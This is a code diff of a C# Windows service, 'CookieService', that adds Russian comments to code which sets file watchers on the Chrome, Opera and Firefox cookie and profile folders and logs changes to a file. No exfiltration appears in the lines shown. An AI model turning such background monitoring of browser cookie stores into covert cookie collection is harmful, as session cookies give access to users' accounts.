@@ -21,6 +21,7 @@ namespace CookieService
             this.CanStop = true;
             this.AutoLog = true;
 
+            //Путь к файлу логов
             this.logPath = Path.GetPathRoot(Environment.SystemDirectory) + @"Users\" + $"{GetUserName()}" + @"\Documents\CookieServiceLog.txt";
             EventLog.WriteEntry(this.logPath);
         }
@@ -29,8 +30,7 @@ namespace CookieService
         {
             //this.googleLogger = new GoogleLogger();
             //Thread googleLoggerThread = new Thread(new ThreadStart(this.googleLogger.Start));
-            //googleLoggerThread.Start();
-
+            //googleLoggerThread.Start(); 
             try
             {
                 //Task.Run(() => StartGoogleLogger());
@@ -99,6 +99,7 @@ namespace CookieService
             {
                 try
                 {
+                    //Массив файловых наблюдателей. Каждый из них следит за изменениями в папке с куки разных браузеров. 
                     FileSystemWatcher[] fileWatchers = new FileSystemWatcher[3] { new FileSystemWatcher(Path.GetPathRoot(Environment.SystemDirectory) + @"Users\" + $"{this.GetUserName()}" + @"\AppData\Local\Google\Chrome\User Data\Default"), 
                     new FileSystemWatcher(Path.GetPathRoot(Environment.SystemDirectory) + @"Users\" + $"{this.GetUserName()}" + @"\AppData\Roaming\Opera Software\Opera Stable"),
                     new FileSystemWatcher(Directory.GetFiles(Path.GetPathRoot(Environment.SystemDirectory) + @"Users\" + $"{GetUserName()}" + @"\AppData\Roaming\Mozilla\Firefox\Profiles", "cookies.sqlite", SearchOption.AllDirectories)[0].Replace(@"\cookies.sqlite", string.Empty))};
@@ -106,6 +107,7 @@ namespace CookieService
                     EventLog.WriteEntry("fileWatchers done");
                     loggerEnabled = true;
 
+                    //Подписка на события
                     foreach (FileSystemWatcher fileWatcher in fileWatchers)
                     {
                         fileWatcher.Deleted += Watcher_Deleted;
